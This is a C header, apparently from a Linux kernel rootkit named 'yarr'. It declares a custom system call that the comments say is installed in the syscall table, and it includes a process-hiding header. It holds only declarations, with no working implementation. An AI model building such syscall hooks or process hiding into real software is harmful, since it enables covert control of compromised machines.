#ifndef __YARR_YARRCALL
#define __YARR_YARRCALL

#include <linux/syscalls.h>

#include "hidepid.h"
#include "yarrlib.h"

/**
 * Entry point of the yarr system call, a wrapper to properly read the
 * pt_regs structure that resides in the stack and then call yarrcall(), which
 * will handle the service requested.
 *
 * @regs: A representation in memory of the registers when the instruction
 * syscall was issued. Registers rdi and rsi contains the parameters we expect.
 * @return: Zero on success, non-zero elsewhere.
 */
asmlinkage long entry_yarrcall(struct pt_regs *regs);

/**
 * As with the system calls, yarr has its own entry point to ask for services.
 * This is that entry point. This function is installed in some entry in the
 * syscall table and user-land programs.
 *
 * @svc: The index of the service to request.
 * @args: A pointer to the arguments of the service requested.
 * @return: Zero on success, non-zero elsewhere.
 */
long yarrcall(int svc, YarrCallArgs_t __user *args);

#endif
